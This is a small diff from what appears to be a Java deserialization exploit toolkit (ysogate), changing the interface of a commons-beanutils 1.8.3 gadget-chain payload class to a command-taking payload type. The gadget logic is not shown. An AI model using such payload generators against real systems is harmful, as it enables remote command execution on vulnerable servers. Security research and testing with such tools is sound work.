@@ -7,7 +7,7 @@ import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
 import javassist.ClassClassPath;
 import javassist.CtClass;
 import javassist.CtField;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -26,7 +26,8 @@ import static com.h2tg.ysogate.config.Config.POOL;
  */
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
 @Authors({"SummerSec"})
-public class CommonsBeanutilsAttrCompare183 implements ObjectPayload<Object> {
+public class CommonsBeanutilsAttrCompare183 implements CommandObjectPayload<Object>
+{
 
 	@Override
 	public Object getObject(String command) throws Exception {
